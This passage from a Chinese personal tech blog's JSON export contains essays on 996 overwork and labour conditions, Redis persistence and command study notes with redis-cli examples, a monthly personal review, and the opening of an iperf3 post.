在工厂干活的，大多数都是这个社会最底层的人，他们没学历，没背景，家庭条件不好，一般都是来自偏远农村的中年人以及农二代。但是实际上最近一些年由于大学扩招的很厉害，我见过很多有学历（大专和本科学历）的年轻人毕业后也沦落到工厂做流水线工人，这主要是大学不停扩招的原因，在工厂上班的人他们不努力工作吗？他们很努力的工作，但是工资普遍只够当地平均工资以下标准。大概1000-3000左右，每天被拼了命的压榨和剥削，很多工厂都一样每天宿舍-车间两点一线，除了工作就是睡觉，晚上下班拖着疲惫的身体到了宿舍除了睡觉已经没有任何精力去干其他事情了。更别提提升自己的能力谋求更好的发展，因此，这些底层的工人只能一辈子重复这种生活，他们想换工作大多数情况下也只能跳到待遇比之前稍微涨个几百块钱的工厂，然而几百钱能干什么呢？ 美国作家芭芭拉·艾伦瑞克的《我在底层的生活》就揭示了穷忙族的生存困境。这些人穷忙族，他们一辈子都只会越忙越穷，永无出头之日，成为资本家剥削和压榨的对象，成为社会发展中的人口红利，并且随着年龄的增大，企业会毫不留情的把他们赶走，他们的晚年可以想象将会变得非常凄惨。 互联网 996我从事互联网行业也有四五年时间了，也待过大大小小好几家公司，第一份工作是网络工程师，经常干到凌晨三四点，因为网络割接调整基本都是半夜后进行，所以经常加班熬夜。后来又从事运维类工作，也是经常熬夜倒班，大半夜被电话叫醒是常有的事情，互联网行业 996 其实是常态，还有 7* 24 on call，即一周7天24小时随时待命，如果遇到紧急情况，得随时能够联系到你。 相比较工厂应该说是需要一定的技术门槛和学历要求，为什么会变成如今这般呢？我觉得： 首先，随着近些年大学教育不断扩招以及互联网行业属于朝阳行业，很多计算机专业的毕业生投入到这个行业中，当然一些非科班的毕业生，比如因为本专业就业不景气等原因也转行投身到了互联网行业来，并且每年都会有一大批的毕业生像流水线一样批量化生产供市场选择，庞大的人口基数以及无数希望出人头地的年轻人挤破头的想进来，如果你不 996，自然有人愿意 996。 其次， IT 行业已经不再是稀缺型技术了，因此供求关系的天平变的像资方倾向，这就是市场经济。最近很多互联网企业都停止社招，说明整个行业的劳动力已经过剩了。 最后，随着移动互联网的普及，基本人手好几部手机，互联网的高速发展已经走到了尽头，资本也就不愿意开高价钱给员工了，也就是行业不景气了，因此待遇会下滑。 现在，那些做着基础类的开发工作，日常工作中只会写写 SQL 语句，会点CURD 的人真的市场上一抓一大把。因此虽然互联网行业有一定技术门槛，但是其实我们这代人和父母那一代在工厂的普通工人真的没有什么特别大的区别。 如何改变命运马云说 996 = 成功，其实听听就好，其实一个人的要想发大财，根本不是靠加班 996 加出来的，甚至根本就不是靠工资得来的，那点微薄的工资真的啥也干不了，个人努力很重要，但是也要考虑历史进程，举个例子国内这一批互联网大佬之所以能够成功是因为他们遇到了改革开放，遇到了互联网这一波新兴技术革命，遇到了中国高速发展的40年，他们站在了浪潮之巅，并把握住了机会，所以他们成功了。就比如蔡文胜投资个域名都可以成功。运气+努力缺一不可。 那么普通人如何改变自己的命运呢？我认为： 首先，努力提升自己的各方面能力，做一个复合型人才而不是专业型人才+ 等待下一波机会，眼光不要仅盯着工作那点事务性的问题上，不要把自己当成一个打工的去工作，天天疲于应付一些没什么技术含量的重复性工作，那样永远不会有成长，即使下一波机会摆在你眼前，你也抓不住。 其次，提升自己的专业能力，让自己变得与众不同，让自己的能力变得稀缺。举个例子，同样是客服岗位小王(化名)今年刚升了职级，而和他同时进来的小李(化名)却没有得到提名升职的机会，原因是小李只是每天手动重复做一些自己本职工作的事情，虽然也做的很好，但是相比较，小王除了本职工作之外，业余还学习编程，并且通过所学的技术在工作中不断优化客服系统，将工作中重复的事务性工作通过自动化的方式实现然后给整个团队使用，提升整个团队的工作效率，如果你是老板，你会给谁加薪升职呢？ 最后，我其实是倡导 996的，但是 996 不是说要你都是处理工作上的事务性问题，而是每天抽出几个小时提升自己，这样未来的路才可以走的更好，机会才会更多。除了提升自己的专业水平本之外，一定要多读书、多学习一些和本岗位无关的知识和技能，比如财务、经济、法律、投资等等，提升自己的见识，这样你看问题才可以看得更长远。 这个世界存在着严重的马太效应，即强者越强，弱者越弱，富人更富，穷人更穷。","categories":[],"tags":[{"name":"随笔","slug":"随笔","permalink":"https://awen.me/tags/%E9%9A%8F%E7%AC%94/"}]},{"title":"Redis持久化之RDB和AOF","slug":"Redis-持久化之-RDB-和-AOF","date":"2019-04-25T05:53:29.000Z","updated":"2021-02-26T06:05:29.264Z","comments":true,"path":"posts/4628.html","link":"","permalink":"https://awen.me/posts/4628.html","excerpt":"RDBRDB持久化是把当前进程数据生成快照保存到硬盘的过程，触发RDB持久化过程分为手动触发和自动触发。","text":"RDBRDB持久化是把当前进程数据生成快照保存到硬盘的过程，触发RDB持久化过程分为手动触发和自动触发。 触发机制手动触发分别对应save 和bgsave save 阻塞redis 服务器，直到RDB过程完成，对于内存比较大的实例会造成长时间阻塞，不建议线上环境使用。 bgsave，fork 子进程完成RDB，阻塞只发生在fork 阶段，一般时间很短。 自动触发 save m n m表示秒内数据集存在n次修改时，自动触发bgsave。 从节点执行全量复制操作，主节点自动执行bgsave生成RDB文件并发送从节点。 执行 debug reload 命令会重新加载redis，会自动触发save操作。 默认执行shutdown，如果没有开启AOF 会自动执行bgsave。 流程 执行bgsave 命令，父进程判断当前是否存在正在执行的子进程，如RDB/AOF 子进行，如果存在bgsave 直接返回结果。 父进程执行fork，fork 过程中会阻塞父进程，通过info stats 查看latest_fork_use 选项，可以获取最近一次fork 的耗时，单位是微秒。 12345127.0.0.1:6379&gt; INFO stats# Stats ……latest_fork_usec:612…… 父进程fork 完，bgsave 命令会返回 background saveing started 信息，并不在阻塞父进程，可以继续响应其他命令。 12127.0.0.1:6379&gt; BGSAVEBackground saving started 子进程创建RDB 文件，根据父进程内存生成临时快照文件，完成后对原有文件进行原子替换。执行lastsave 命令可以获取最后一次生成RDB 的时间，对应 info 统计中的rdb_last_save_time 选项。 12127.0.0.1:6379&gt; LASTSAVE(integer) 1556158402 进程发送信号给父进程表示完成，父进程更新统计信息，具体见 info Persistence下的 rdb_* 相关选项。 123456789101112131415161718127.0.0.1:6379&gt; INFO stats# Persistenceloading:0rdb_changes_since_last_save:0rdb_bgsave_in_progress:0rdb_last_save_time:1556158402rdb_last_bgsave_status:okrdb_last_bgsave_time_sec:0rdb_current_bgsave_time_sec:-1rdb_last_cow_size:24240128aof_enabled:0aof_rewrite_in_progress:0aof_rewrite_scheduled:0aof_last_rewrite_time_sec:-1aof_current_rewrite_time_sec:-1aof_last_bgrewrite_status:okaof_last_write_status:okaof_last_cow_size:0 配置 RDB 优缺点RDB的优点： RDB是一个紧凑压缩的二进制文件，代表Redis在某个时间点上的数据快照。非常适用于备份，全量复制等场景。比如每6小时执行bgsave备份，并把RDB文件拷贝到远程机器或者文件系统中（如hdfs），用于灾难恢复。 Redis加载RDB恢复数据远远快于AOF的方式。 RDB的缺点： RDB方式数据没办法做到实时持久化/秒级持久化。因为bgsave每次运行都要执行fork操作创建子进程，属于重量级操作，频繁执行成本过高。 RDB文件使用特定二进制格式保存，Redis版本演进过程中有多个格式的RDB版本，存在老版本Redis服务无法兼容新版RDB格式的问题。针对RDB不适合实时持久化的问题，Redis提供了AOF持久化方式来解决。 AOFAOF（append only file）持久化：以独立日志的方式记录每次写命令，重启时再重新执行AOF文件中的命令达到恢复数据的目的。AOF的主要作用是解决了数据持久化的实时性，目前已经是Redis持久化的主流方式。理解掌握好AOF持久化机制对我们兼顾数据安全性和性能非常有帮助。 使用配置 1234cat redis.conf | grep ^appendappendonly noappendfilename &quot;appendonly.aof&quot;appendfsync everysec AOF的工作流程操作：命令写入（append）、文件同步（sync）、文件重写（rewrite）、重启加载（load） 流程 所有写入追加到 aof_buf 中。 AOF 缓冲区根据对应的策略向硬盘做同步操作。 随着AOF文件的变大，需要定期对AOF 文件进行重写，达到压缩目的。 当redis 服务器重启时，可以加载AOF文件进行数据恢复。 为什么采用文本方式写入 AOF 写入采用文本方式，理由如下: 兼容性好 开启AOF 后，所有写操作都是追加的，避免了二次处理开销。 文本协议具有可读性，方便直接修改和处理。 为什么要把命令追加到AOF_BUF redis 使用单线程响应命令，如果每次写AOF 都直接追加到磁盘，性能会很差，先写入缓存区，然后在同步到磁盘性能会有很大提升。 AOF 的文件同步 可配置值 说明 always 命令写人aof_ buf 后调用系统fsync操作同步到AOF文件，fsync 完成后线程返回 everysec 命令写入aof_ buf后调用系统write操作，write完成后线程返回。fsync 同步文件操作由专门线程每秒调用- -次 no 命令写人aof_ buf 后调用系统write操作，不对AOF文件做fsync同步，同步硬盘操作由操作系统负责，通常同步周期最长30秒 系统调用write和fsync说明： write操作会触发延迟写（delayed write）机制。Linux在内核提供页缓冲区用来提高硬盘IO性能。write操作在写入系统缓冲区后直接返回。同步硬盘操作依赖于系统调度机制，例如：缓冲区页空间写满或达到特定时间周期。同步文件之前，如果此时系统故障宕机，缓冲区内数据将丢失。 fsync针对单个文件操作（比如AOF文件），做强制硬盘同步，fsync将阻塞直到写入硬盘完成后返回，保证了数据持久化。 AOF 重写随着不断写入AOF 文件不断变大，redis 通过AOF 重写机制压缩文件体积。把进程内的数据转化为写命令同步到新的AOF文件。 重写AOF的优势 降低文件占用，提升redis 加载速度。 AOF 分手动和自动触发 手动： bgrewriteaof 自动，根据配置文件中的下面2个参数确定自动触发时间 123# cat redis.conf |grep ^auto-aofauto-aof-rewrite-percentage 100 # 表示当前AOF 文件空间（aof_current_size）和上一次重写后AOF文件空间（aof_base_size）的比auto-aof-rewrite-min-size 64mb # 表示运行AOF重写时的文件最小体积 自动触发时机=aof_current_size&gt;auto-aof-rewrite-min\u0002size&amp;&amp;（aof_current_size-aof_base_size）/aof_base_size&gt;=auto-aof-rewrite\u0002percentage其中aof_current_size和aof_base_size可以在info Persistence统计信息中查。 流程说明 执行AOF 重写请求，如果当前有进程正在执行AOF重写，请求不执行并返回 1ERR Background append only file rewriting already in progre 如果当前正在执行bgsave，重写命令延迟到bgsave 完成后执行，返回 1Background append only file rewriting schedul 父进程fork 子进程，开销等同于bgsave。 主进程 fork 后，继续执行其他命令，所有修改依然写入AOF 缓冲区，并根据appendfsync 策略同步到磁盘。 由于fork 操作运用写时复制技术，子进程只贡献fork 操作时的内存数据，由于父进程依然响应命令，redis 使用AOF重写缓冲区保存这部分新数据，防止新AOF文件生成时丢失这部分数据。 子进程根据内存快照，按命令合并规则写入到新的AOF 文件。每次批量写入磁盘数据由配置置aof-rewrite-incremental-fsync控制，默认为32MB，防止单次刷盘数据过多造成硬盘阻塞。 新AOF 文件写入后，子进程发送信号给父进程，更新统计信息。 父进程把AOF 重写缓存区的数据写入到新AOF文件。 使用新AOF文件替换老文件，完成AOF重写。 问题定位与优化fork 操作耗时问题排查redis 做 RDB 或 AOF 重写时，会进行fork，虽然fork创建的子进程不需要拷贝父进程的物理内存空间，但是会复制父进程的空间内存页表。例如对于10GB的Redis进程，需要复制大约20MB的内存页表，因此fork操作耗时跟进程总内存量息息相关，如果使用虚拟化技术，特别是Xen虚拟机，fork操作会更耗时。 如何改善fork操作的耗时：1）优先使用物理机或者高效支持fork操作的虚拟化技术，避免使用Xen。2）控制Redis实例最大可用内存，fork耗时跟内存量成正比，线上建议每个Redis实例内存控制在10GB以内。3）合理配置Linux内存分配策略，避免物理内存不足导致fork失败。4）降低fork操作的频率，如适度放宽AOF自动触发时机，避免不必要的全量复制等。 子进程开销监控和优化CPU CPU开销分析。子进程负责把进程内的数据分批写入文件，这个过程属于CPU密集操作，通常子进程对单核CPU利用率接近90%. CPU消耗优化。Redis是CPU密集型服务，不要做绑定单核CPU操作。由于子进程非常消耗CPU，会和父进程产生单核资源竞争。 不要和其他CPU密集型服务部署在一起，造成CPU过度竞争。 如果部署多个Redis实例，尽量保证同一时刻只有一个子进程执行重写工作。 内存 内存消耗分析。子进程通过fork操作产生，占用内存大小等同于父进程，理论上需要两倍的内存来完成持久化操作，但Linux有写时复制机制（copy-on-write）。父子进程会共享相同的物理内存页，当父进程处理写请求时会把要修改的页创建副本，而子进程在fork操作过程中共享整个父进程内存快照。 内存消耗监控。 磁盘通过iostat 等监控磁盘负载。","categories":[],"tags":[{"name":"redis","slug":"redis","permalink":"https://awen.me/tags/redis/"}]},{"title":"redis 运维和开发指南-学习笔记","slug":"redis-运维和开发指南-学习笔记","date":"2019-04-24T09:23:58.000Z","updated":"2021-02-26T06:05:29.290Z","comments":true,"path":"posts/57514.html","link":"","permalink":"https://awen.me/posts/57514.html","excerpt":"为什么用 redis 速度快 10万每秒的读写速度，c语言实现、单线程，预防多线程可能存在的竞争问题 基于键值对的数据结构服务器 字符串、哈希、列表、集合、有序集合、位图、hyperloglog GEO(地理位置定位) 功能丰富 提供了键过期功能，可以用来实现缓存 提供了发布订阅功能，可以用来实现消息系统 支持Lua脚本功能，可以利用Lua创造出新的Redis命令 ·提供了简单的事务功能，能在一定程度上保证事务特性 ·提供了流水线（Pipeline）功能，这样客户端能将一批命令一次性传到Redis，减少了网络的开销 简单稳定，早期版本2万行代码，3.0以后 代码增加至 5万行。 持久化，提供RDB和AOF 两种策略将内存的数据保存在硬盘中 主从复制 高可用和分布式","text":"为什么用 redis 速度快 10万每秒的读写速度，c语言实现、单线程，预防多线程可能存在的竞争问题 基于键值对的数据结构服务器 字符串、哈希、列表、集合、有序集合、位图、hyperloglog GEO(地理位置定位) 功能丰富 提供了键过期功能，可以用来实现缓存 提供了发布订阅功能，可以用来实现消息系统 支持Lua脚本功能，可以利用Lua创造出新的Redis命令 ·提供了简单的事务功能，能在一定程度上保证事务特性 ·提供了流水线（Pipeline）功能，这样客户端能将一批命令一次性传到Redis，减少了网络的开销 简单稳定，早期版本2万行代码，3.0以后 代码增加至 5万行。 持久化，提供RDB和AOF 两种策略将内存的数据保存在硬盘中 主从复制 高可用和分布式 redis APIttl命令会返回键的剩余过期时间，它有3种返回值： 大于等于0的整数：键剩余的过期时间。64 -1：键没设置过期时间。 -2：键不存在 如下所示 123456789101112127.0.0.1:6379&gt; set hello wordOK127.0.0.1:6379&gt; EXPIRE hello 10(integer) 1127.0.0.1:6379&gt; ttl hello(integer) 7127.0.0.1:6379&gt; ttl hello(integer) 1127.0.0.1:6379&gt; ttl hello(integer) 0127.0.0.1:6379&gt; ttl hello(integer) -2 键的数据结构类型 12345678127.0.0.1:6379&gt; set a bOK127.0.0.1:6379&gt; type astring127.0.0.1:6379&gt; RPUSH mylist a b c d e f g(integer) 7127.0.0.1:6379&gt; type mylistlist redis 内部数据结构type命令实际返回的就是当前键的数据结构类型，它们分别是：string（字符串）、hash（哈希）、list（列表）、set（集合）、zset（有序集合），但这些只是Redis对外的数据结构,实际上每种数据结构都有自己底层的内部编码实现，而且是多种实现，这样Redis会在合适的场景选择合适的内部编码， 1234127.0.0.1:6379&gt; OBJECT encoding hello&quot;embstr&quot;127.0.0.1:6379&gt; OBJECT encoding mylist&quot;quicklist&quot; 这样设计的好处: 第一，可以改进内部编码，而对外的数据结构和命令没有影响，这样一旦开发出更优秀的内部编码，无需改动外部数据结构和命令。 第二，多种内部编码实现可以在不同场景下发挥各自的优势，例如ziplist比较节省内存，但是在列表元素比较多的情况下，性能会有所下降，这时候Redis会根据配置选项将列表类型的内部实现转换为linkedlist。 单线程架构Redis使用了单线程架构和I/O多路复用模型来实现高性能的内存数据库服务 第一，纯内存访问，Redis将所有数据放在内存中，内存的响应时长大约为100纳秒，这是Redis达到每秒万级别访问的重要基础。 第二，非阻塞I/O，Redis使用epoll作为I/O多路复用技术的实现，再加上Redis自身的事件处理模型将epoll中的连接、读写、关闭都转换为事件，不在网络I/O上浪费过多的时间。 第三，单线程避免了线程切换和竞态产生的消耗。 第四，单线程可以简化数据结构和算法的实现。如果对高级编程语言熟悉的读者应该了解并发数据结构实现不但困难而且开发测试比较麻烦。 第五，单线程避免了线程切换和竞态产生的消耗，对于服务端开发来说，锁和线程切换通常是性能杀手。 缺陷：对于每个命令的执行时间是有要求的。如果某个命令执行过长，会造成其他命令的阻塞，对于Redis这种高性能的服务来说是致命的，所以Redis是面向快速执行场景的数据库。 set 、setnx、setxxset命令有几个选项： ex seconds：为键设置秒级过期时间。 px milliseconds：为键设置毫秒级过期时间。 nx：键必须不存在，才可以设置成功，用于添加。 xx：与nx相反，键必须存在，才可以设置成功，用于更新。 setnx和setxx在实际使用中有什么应用场景吗？以setnx命令为例子，由Redis的单线程命令处理机制，如果有多个客户端同时执行setnx key value，根据setnx的特性只有一个客户端能设置成功，setnx可以作为分布式锁的一种实现方案，Redis官方给出了使用setnx实现分布式锁的方法：http://redis.io/topics/distlock 字符串、哈希、列表、集合mset 和mget 1n次get 时间 &#x3D; n次网络时间+n次命令时间 使用mget 后 1n次get 时间 &#x3D; 1次网络时间+ n次命令时间 字符串字符串的内部编码字符串类型的内部编码有3种： int：8个字节的长整型。 embstr：小于等于39个字节的字符串。 raw：大于39个字节的字符串。 Redis会根据当前值的类型和长度决定使用哪种内部编码实现 如下: 123456789101112127.0.0.1:6379&gt; set key 123OK127.0.0.1:6379&gt; object encoding key&quot;int&quot;127.0.0.1:6379&gt; set key &quot;hello world&quot;OK127.0.0.1:6379&gt; object encoding key&quot;embstr&quot;127.0.0.1:6379&gt; set key &quot;hello worldsfdsgdfghfgjghjghjtyyrtyrtyrtyrtytr........ttttytytryrtyrty.&quot;OK127.0.0.1:6379&gt; object encoding key&quot;raw&quot; 哈希类型1234567891011121314151617181920212223242526127.0.0.1:6379&gt; hset user:1 name tome(integer) 1127.0.0.1:6379&gt; hset user:1 age 14(integer) 1127.0.0.1:6379&gt; hkeys user:11) &quot;name&quot;2) &quot;age&quot;127.0.0.1:6379&gt;27.0.0.1:6379&gt; HMSET user:2 name tom age 14 city hangzhouOK127.0.0.1:6379&gt; HMGET user:2 name city1) &quot;tom&quot;2) &quot;hangzhou&quot;127.0.0.1:6379&gt; HEXISTS user:2 name(integer) 1127.0.0.1:6379&gt; HVALS user:21) &quot;tom&quot;2) &quot;14&quot;3) &quot;hangzhou&quot;127.0.0.1:6379&gt; hgetall user:1 # 获取所有的可以1) &quot;name&quot;2) &quot;tome&quot;3) &quot;age&quot;4) &quot;14&quot;127.0.0.1:6379&gt; HSTRLEN user:1 name # 计算value 的长度(integer) 4 在使用hgetall时，如果哈希元素个数比较多，会存在阻塞Redis的可能。如果开发人员只需要获取部分field，可以使用hmget，如果一定要获取全部field-value，可以使用hscan命令，该命令会渐进式遍历哈希类型。 哈希类型的内部编码 ziplist（压缩列表）：当哈希类型元素个数小于hash-max-ziplist-entries配置（默认512个）、同时所有值都小于hash-max-ziplist-value配置（默认64字节）时，Redis会使用ziplist作为哈希的内部实现，ziplist使用更加紧凑的结构实现多个元素的连续存储，所以在节省内存方面比hashtable更加优秀。 hashtable（哈希表）：当哈希类型无法满足ziplist的条件时，Redis会使用hashtable作为哈希的内部实现，因为此时ziplist的读写效率会下降，而hashtable的读写时间复杂度为O（1）。 列表从右边插入 1234567127.0.0.1:6379&gt; rpush listkey c b a(integer) 3127.0.0.1:6379&gt; lrange listkey 0 -11) &quot;c&quot;2) &quot;b&quot;3) &quot;a&quot;127.0.0.1:6379&gt; 从左边插入 12127.0.0.1:6379&gt; LPUSH key a b c(integer) 3 从指定元素前面或后面插入 12345678127.0.0.1:6379&gt; LINSERT key before b c # before 前面 after 后面(integer) 4127.0.0.1:6379&gt; LRANGE key 0 -11) &quot;c&quot;2) &quot;c&quot;3) &quot;b&quot;4) &quot;a&quot;127.0.0.1:6379&gt; 获取列表长度和指定下标的元素 1234127.0.0.1:6379&gt; LINDEX key -1&quot;a&quot;127.0.0.1:6379&gt; LLEN key(integer) 4 删除 12lpop key rpop key 慢查询Redis提供了slowlog-log-slower-than和slowlog-max-len配置来解决这两个问题。slowlog-log-slower-than就是那个预设阀值，它的单位是微秒（1秒=1000毫秒=1000000微秒），默认值是10000。 如果slowlog-log-slower-than=0会记录所有的命令，slowlog-log-slower\u0002than&lt;0对于任何命令都不会进行记录。 1234567891011121327.0.0.1:6379&gt; config set slowlog-log-slower-than 20000OK127.0.0.1:6379&gt; config set slowlog-max-len 1000OK127.0.0.1:6379&gt; config rewriteOK127.0.0.1:6379&gt;127.0.0.1:6379&gt; SLOWLOG get(empty list or set)127.0.0.1:6379&gt; SLOWLOG len(integer) 0127.0.0.1:6379&gt; SLOWLOG resetOK 慢查询功能可以有效地帮助我们找到Redis可能存在的瓶颈，但在实际使用过程中要注意以下几点： slowlog-max-len配置建议：线上建议调大慢查询列表，记录慢查询时Redis会对长命令做截断操作，并不会占用大量内存。增大慢查询列表可以减缓慢查询被剔除的可能，例如线上可设置为1000以上。 slowlog-log-slower-than配置建议：默认值超过10毫秒判定为慢查询，需要根据Redis并发量调整该值。由于Redis采用单线程响应命令，对于高流量的场景，如果命令执行时间在1毫秒以上，那么Redis最多可支撑OPS不到1000。因此对于高OPS场景的Redis建议设置为1毫秒。 慢查询只记录命令执行时间，并不包括命令排队和网络传输时间。因此客户端执行命令的时间会大于命令实执行时间。因为命令执行排队机制，慢查询会导致其他命令级联阻塞，因此当客户端出现请求超时，需要检查该时间点是否有对应的慢查询，从而分析出是否为慢查询导致的命令级联阻塞。 由于慢查询日志是一个先进先出的队列，也就是说如果慢查询比较多的情况下，可能会丢失部分慢查询命令，为了防止这种情况发生，可以定期执行slow get命令将慢查询日志持久化到其他存储中（例如MySQL），然后可以制作可视化界面进行查询，第13章介绍的Redis私有云CacheCloud提供了这样的功能，好的工具可以让问题排查事半功倍","categories":[],"tags":[{"name":"redis","slug":"redis","permalink":"https://awen.me/tags/redis/"}]},{"title":"2019年3月份回顾","slug":"2019年3月份回顾","date":"2019-04-08T11:11:31.000Z","updated":"2021-02-26T06:05:29.239Z","comments":true,"path":"posts/59786.html","link":"","permalink":"https://awen.me/posts/59786.html","excerpt":"2019年3月份已经过去了，回顾下这个月干的事情: 学习本月学习了极客时间专栏 《Linux 性能调优》 80% 《MYSQL 实战 45讲》 的相关内容。 40%","text":"2019年3月份已经过去了，回顾下这个月干的事情: 学习本月学习了极客时间专栏 《Linux 性能调优》 80% 《MYSQL 实战 45讲》 的相关内容。 40% 博客更新本月博客更新 40篇，大部分都是学习笔记。 写作给CSDN 投稿 6 篇，稿费不多，刚好够3月换电瓶车的钱。4月份电瓶车新规发布，特么的刚上个牌子就被偷了。无奈只能把车子二手卖了换个新车上个黄牌稳妥点。 病情指标明显下降，蛋白++变成+，目前继续吃药控制，因为激素的原因导致身上长了很多痤疮。医生让3个月体检一次。第一次把医保卡历年账户的钱用完还贴了1000多，刚好满足社保的报销门槛，加上公司商业保险报销，看病没花多少钱。总共774，医保报销了538.39.商业保险报销了120多，个人付了不到100。","categories":[],"tags":[{"name":"随笔","slug":"随笔","permalink":"https://awen.me/tags/%E9%9A%8F%E7%AC%94/"}]},{"title":"这届年轻人不行","slug":"这届年轻人不行","date":"2019-04-03T09:54:37.000Z","updated":"2021-02-26T06:05:29.359Z","comments":true,"path":"posts/22013.html","link":"","permalink":"https://awen.me/posts/22013.html","excerpt":"那些被压榨的社畜 所谓 996，就是早上9点上班，晚上9点下班，一周上班6天，一个星期至少工作72小时，而社畜，就是指那些被公司当作牲口畜生一样压榨的员工。","text":"那些被压榨的社畜 所谓 996，就是早上9点上班，晚上9点下班，一周上班6天，一个星期至少工作72小时，而社畜，就是指那些被公司当作牲口畜生一样压榨的员工。 近日，一段“小伙骑车逆行被拦后爆发”的视频在网络热传，很多网友看了之后都评论说，仿佛看到了自己。 事情发生在3月25日杭州西湖区文一路某超市附近，当时西湖区交警大队正在进行非机动车的违法整治，拦住了一辆骑车逆行的小伙子，当被交警拦下后，小伙平静的先打了个电话给女友说”我逆向行车被抓了，现在走不了，你在那儿等我吧。”，但是挂完电话，小伙就出人意料的将手机重重的摔倒了地上。 随后小伙情绪突然激动起来，提高了嗓子说：“我第一次做这种事（骑车逆行），这边一直在催着我，我加班，我赶回去有事啊！”，并跪倒在地，“求你们了，让我干嘛都可以，要罚款我交钱，我认了，身份证也给你……”说着小伙失声痛哭起来，还把身份证塞进交警手里。 民警让小伙子赶紧起来，不要激动，可不料小伙子却突然边哭边跑向路边一座桥，趴在了桥栏上。民警担心他有轻生的念头。一把把他拉过来。 经过了解小伙子觉得自己压力好大，每天加班到十一二点，因为女朋友回家没带钥匙，他骑车是要给女去送钥匙，单位和女朋友都在催着他，他真的好烦，只想哭一下。 像这种加班到十一二点的人，那些在996员工都是看着应该觉得心里舒服些了吧。 当代中国青年压力太大了，工作时长是罪魁祸首，拒调查，中国人年均工作2000至2200小时，而英国人年均工作为1677小时，日本人年均工作1729小时，可见中国年轻人的工作时间要远远超过大多数国家的年轻人。 今年以来 996 这个话题被炒得已经不是一次2次了，年初杭州有赞在年会公开宣布 996 被网友吐槽甚至举报到劳动局。有赞的 996 只不过是把平时大多数企业一直在做的事情摆到了台面上而已。 github 上最近最火的一个项目 996.ICU 被 star 146979 次。该项目称是 IT 从业者发起的一项倡议，要求雇主尊重雇员的合法权益。 现实版摩登时代 卓别林的《摩登时代》讲述的是发生在20世纪的美国，时值美国经济大萧条的高峰期，在此期间，社会经济虽然有一定发展，但是，资本主义制度的基本矛盾依然存在。资本家攫取了高额利润，广大劳动人民却日益贫困，资本家为眼前的利润驱使，盲目扩大生产，使得生产和销售之间的矛盾日益尖锐。穷人想尽一切办法艰难度日，常常食不果腹，衣不御寒；而资本家为了维持商品价格，保证利润，不惜大量销毁商品。 工人查理(卓别林饰)在工厂干活、发疯、进入精神病院的经历，本片讽刺了本应以提高劳动生产率、减轻体力劳动为目的的机械化，实际上却加重了工厂对工人的压榨——连工人吃饭的时间都一省再省，而工人查理便是这群弱势群体的代表人物。社会中的每一个人都在自己的生活中苦苦挣扎。 马克思在《资本论》中曾经引用托·约·登宁《工会与罢工》文中的句子:”一有适当的利润，资本就胆大起来。如果有10％的利润，它就保证到处被使用；有20％的利润，它就活跃起来；有50％的利润，它就铤而走险；有100％的利润，它就敢践踏一切人间法律；有300％的利润，它就敢犯任何罪行，甚至冒绞首的危险。” 相比较卓别林那个时代，现如今的工业和科技发展水平已经远远超过当时的水平了，然而事实是底层人民的工作时间却丝毫没有变化，还是被以各种直接或间接的方式进行压榨。真的是又让我想起了张养浩的《山坡羊·潼关怀古》中的诗句”兴，百姓苦；亡，百姓苦”，当天下安定，皇家定要大兴建设，劳民伤财，百姓不好过，如果国家灭亡，灾难四起。战祸不断，百姓也受苦。 我们这届年轻人正是在被高企的房价透支着未来，被996透支着健康。 作为金字塔底层的劳苦大众，我们都深知我们并没有多少资本和能力去反抗这种不公平的规则和制度。唯一一部能够保护劳动者的《劳动法》大多数时候也并不能给底层劳动者带来什么特别大的帮助。 自1995年1月1日起施行的《劳动法》颁发及修改至今已经快 19 年，有多少企业是严格按照劳动法的法律法规来保障职工的基本权益的？我看到的是很多中小企业连职工最基本的养老保险都不缴纳甚至最低额度缴纳，却一天天打鸡血一样要求员要有奋斗精神，要有狼性，狼是要吃肉的，你给员工吃的是肉吗？ 不要大声责骂年轻人，他们会立刻辞职的，但是你可以往死里骂那些中年人，尤其是有房有车有娃的那些。 然而年轻人也有成为中年人、会有房有娃的那一天。 马斯洛的需求层次理论最底层是生理需求，然而被残酷的现实—加班所裹挟的年轻人，这个基本的需求都无法得到满足。何谈更上层的各种需求？ 你远没有想象的那么重要 可能大多数人会有一种幻觉，那就是觉得自己的技术好，技术牛，就有话语权。事实上，这确实是会占一部分比例，但是大多数人都达不到这个要求，像乔布斯这么牛逼的人物都曾经被赶出自己的公司。何况广大底层的码农们。 互联网诞生至今已经30几年了，各种产品基本都是基于开源的项目二次开发或者借鉴这些项目和成熟的工具来做开发，都是一些成熟的框架和工具，并且每年都会有一大批廉价的毕业生以及各种培训机构培养一批一批的人员供市场选择，就像流水线一样批量化生产。 一个成熟的企业，都有自己的一套非常标准的流程和体系，不会因为缺一个人就导致整个项目无法运作，大多数岗位只需要负责一些被拆分后非常细化的领域做一些基本开发工作，而且每一步都会有标准化的流程，你很难接触到整个项目的开发流程，换句话说你只不过是一个拧螺丝的而已。况且随着年龄的增大以及家庭负担等因素，身体各项机能和学习能力会自然而然的退化，相比较年轻人，你的优势会越来越比不过年轻人。 现在社会，没有人能够保证你可以在一家企业干到退休，华为等知名互联网公司都在以各种方式驱赶那些中年人和老人，原因就是年轻人比你更便宜，更有活力。 那么，作为普通人，我们如何才能逃脱这种被安排的”宿命“？我觉得： 首先，我希望类似 996 ICU 这类项目可以得到更多人的认可和关注，希望大环境越来越好，但是事实上我觉得并不会改变多少。也仅仅是笔者的一些希望而已。 既然我们不能轻易改变，那我们就改变自己吧，作为一个普通码农，不仅仅要埋头苦干，还要抬头向前，千万不要盯着工作上那一亩三分地就止步不前，一定要学会投资。 这里的投资，不仅仅要学会理财，更重要的是要学会投资自己，投资自己的大脑，趁着年轻力剩多学习，提升自己的核心竞争力，早日摆脱底层码农的命运。 其次，要学会分散投资，千万不要把所有的期望都寄托在一家单位身上。一定要在主业稳定后寻求副业。把鸡蛋放在不同的篮子里面，分散风险。 最后，一定要记得定期体检和锻炼，身体是革命的本钱。这才是最关键的，当你身体垮了之后，一切都完了。 成年人的世界里，没有容易二字。不仅仅是互联网从业者，各行各业的从业者都在被时代这座机器拉着快速向前，作为个体我们没有办法放慢脚步停止不前，一旦停止，那便就真的可能被淘汰了。","categories":[],"tags":[{"name":"随笔","slug":"随笔","permalink":"https://awen.me/tags/%E9%9A%8F%E7%AC%94/"}]},{"title":"使用iperf3测试带宽","slug":"使用iperf3测试带宽","date":"2019-04-01T10:21:31.000Z","updated":"2021-02-26T06:05:29.309Z","comments":true,"path":"posts/47745.html","link":"","permalink":"https://awen.me/posts/47745.html","excerpt":"很多时候，我们需要知道2台机器之间的带宽最大能够达到多少。这个时候我们可以通过iperf3 